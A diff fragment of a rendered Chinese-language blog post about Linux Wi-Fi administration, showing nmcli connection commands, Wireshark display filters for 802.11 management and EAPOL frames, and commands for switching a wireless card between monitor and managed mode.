+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>nmcli con delete id <span style="color:#e6db74">&#34;SSID&#34;</span>
+</span></span></code></pre></div><p>注意，如果我们不删除记录，可能在再次连接wifi的时候出现无法找到加密报错</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>Error: 802-11-wireless-security.key-mgmt: property is missing.
+</span></span></code></pre></div><p>出现这种报错直接删除此wifi记录，或者手动指定加密方式(我给出的示例是wpa2)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nmcli dev wifi connect <span style="color:#e6db74">&#34;SSID&#34;</span> password <span style="color:#e6db74">&#34;PASSWORD&#34;</span> ifname wlan0 wifi-sec.key-mgmt wpa-psk
+</span></span></code></pre></div><h3 id="wireshark分析管理帧">wireshark分析管理帧
+</h3><p>查找来自ap的接入帧</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#f92672">(</span>wlan.fc.type <span style="color:#f92672">==</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">(</span>wlan.fc.type_subtype <span style="color:#f92672">==</span> 8<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>查找来自ap的探测请求帧</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#f92672">(</span>wlan.fc.type <span style="color:#f92672">==</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">(</span>wlan.fc.type_subtype <span style="color:#f92672">==</span> 4<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>查找来自ap的探测响应帧</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#f92672">(</span>wlan.fc.type <span style="color:#f92672">==</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">(</span>wlan.fc.type_subtype <span style="color:#f92672">==</span> 5<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>查找客户端和接入点之间的身份验证过程</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#f92672">(</span>wlan.fc.type <span style="color:#f92672">==</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">(</span>wlan.fc.type_subtype <span style="color:#f92672">==</span> 11<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>查找请求后的关联请求</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#f92672">(</span>wlan.fc.type <span style="color:#f92672">==</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">(</span>wlan.fc.type_subtype <span style="color:#f92672">==</span> 0<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>查找请求后的关联响应</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#f92672">(</span>wlan.fc.type <span style="color:#f92672">==</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">(</span>wlan.fc.type_subtype <span style="color:#f92672">==</span> 1<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>如果网络使用wpa2，可以使用EAPOL查看握手帧</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>eapol
+</span></span></code></pre></div><p>查看取消关联帧或者身份验证帧</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#f92672">(</span>wlan.fc.type <span style="color:#f92672">==</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">(</span>wlan.fc.type_subtype <span style="color:#f92672">==</span> 12<span style="color:#f92672">)</span> or <span style="color:#f92672">(</span>wlan.fc.type_subtype <span style="color:#f92672">==</span> 10<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h3 id="切换网卡监听模式并恢复">切换网卡监听模式并恢复
+</h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo ip link set wlan0 down <span style="color:#75715e">#关闭网卡</span>
+</span></span><span style="display:flex;"><span>sudo iw dev wlan0 set type monitor <span style="color:#75715e">#将网卡设置为监听模式</span>
+</span></span><span style="display:flex;"><span>or
+</span></span><span style="display:flex;"><span>sudo iw dev wlan0 set type managed <span style="color:#75715e">#将网卡设置为普通模式</span>
+</span></span><span style="display:flex;"><span>sudo ip link set wlan0 up <span style="color:#75715e">#启动网卡</span>
+</span></span><span style="display:flex;"><span>iwconfig wlan0 <span style="color:#75715e">#查看当前网卡模式</span>
 </span></span></code></pre></div>
 </section>
 
